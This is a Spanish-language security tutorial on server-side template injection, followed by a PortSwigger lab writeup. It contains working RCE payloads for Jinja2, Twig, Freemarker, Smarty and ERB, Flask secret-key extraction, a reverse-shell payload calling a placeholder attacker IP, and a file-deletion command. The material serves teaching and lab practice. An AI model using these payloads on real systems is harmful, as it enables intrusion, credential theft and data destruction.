# SSTI (Server-Side Template Injection)

**SSTI** ocurre cuando la entrada del usuario se incrusta en una **plantilla del lado servidor** (Jinja2, Twig, Freemarker, etc.) y se evalúa como código de la plantilla en vez de como texto. Según el motor, va desde fuga de datos hasta **RCE completo**.

---

## Cómo se ve

Aparece donde la app refleja tu entrada tras procesarla con un motor de plantillas: nombres de perfil, asuntos de email, páginas de error personalizadas, generadores de informes.

### Detección

Inyecta una operación matemática que solo un motor de plantillas evaluaría:

```text
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{7*'7'}}
```

Si en la respuesta aparece `49` (o `7777777` con `7*'7'` en Jinja), hay SSTI.

> **Consejo:** `{{7*7}}` → 49 confirma motores tipo Jinja2/Twig. `{{7*'7'}}` distingue: `49` en Twig, `7777777` en Jinja2 (Python). Identificar el motor es clave para elegir el payload de RCE.

---

## Identificar el motor

Usa el árbol de decisión de **tplmap**/PayloadsAllTheThings, o prueba sintaxis distintas:

```text
{{7*7}}      -> Jinja2, Twig (Python/PHP)
${7*7}       -> Freemarker, Thymeleaf (Java), JSP
#{7*7}       -> Ruby (ERB con <%= %>), algunos
{7*7}        -> otros
@(7*7)       -> Razor (.NET)
```

---

## Explotación: RCE

### Jinja2 (Python / Flask) — el más común en labs

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Payload clásico recorriendo subclases (funciona en muchas versiones):

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Localiza `subprocess.Popen` y úsalo:
```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[<N>]('id',shell=True,stdout=-1).communicate() }}
```

Lectura de config (Flask):
```jinja
{{ config.items() }}
{{ config['SECRET_KEY'] }}
```

### Twig (PHP)

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Smarty (PHP)

```smarty
{system('id')}
```

---

## De RCE a reverse shell

Una vez ejecutas comandos, lanza una shell (ver *Técnicas · Shells y TTY*):

```jinja
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/TU_IP/443 0>&1"').read() }}
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `tplmap` | Detección y explotación automática de SSTI. |
| `Burp Suite` | Pruebas manuales y ajuste de payloads. |
| PayloadsAllTheThings (SSTI) | Payloads por motor de plantillas. |

---

> **Consejo:** detecta siempre con `{{7*7}}` y sus variantes; si algo se evalúa, identifica el motor con `{{7*'7'}}` y ve al payload de RCE correspondiente. En labs de Python/Flask, Jinja2 con el truco de `__globals__.os.popen` resuelve la gran mayoría. Y aunque no logres RCE, leer `config` (SECRET_KEY) puede permitirte forjar cookies de sesión.

---

## Dónde practicar la SSTI

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — Server-side template injection | Labs gratis | https://portswigger.net/web-security/server-side-template-injection |
| Writeups/retos con Flask+Jinja2 | TryHackMe | https://tryhackme.com |
| VulnHub / DockerLabs | Máquinas completas | https://www.vulnhub.com · https://dockerlabs.es |
| tplmap (práctica de automatización) | GitHub | https://github.com/epinna/tplmap |

## Writeup guiado: SSTI básica (PortSwigger)

Lab: *"Basic server-side template injection"* (motor ERB/Ruby). Objetivo: RCE para borrar `/home/carlos/morale.txt`.

```flow
Detectar :: Inyectar una operación matemática en el parámetro vulnerable.
Identificar :: Confirmar el motor por el comportamiento de la respuesta.
Explotar :: Payload de RCE del motor para ejecutar un comando.
Resolver :: Borrar el fichero objetivo.
```

### Paso 1 — Detectar

El parámetro `message` (o la vista de un producto) refleja tu entrada en una plantilla. Inyecta:

```text
${7*7}        -> si da 49, motor tipo Freemarker/Java
{{7*7}}       -> si da 49, Jinja2/Twig
<%= 7*7 %>    -> si da 49, ERB (Ruby)  <- el de este lab
```

### Paso 2 — Explotar (ERB → RCE)

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

El fichero se borra y el lab queda resuelto.

> **Consejo:** repite los demás labs de PortSwigger (uno por motor y uno "sin saber el motor") para aprender a **fingerprintear** el engine — es el 80% del trabajo real en SSTI. En máquinas Flask, el payload estrella es `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
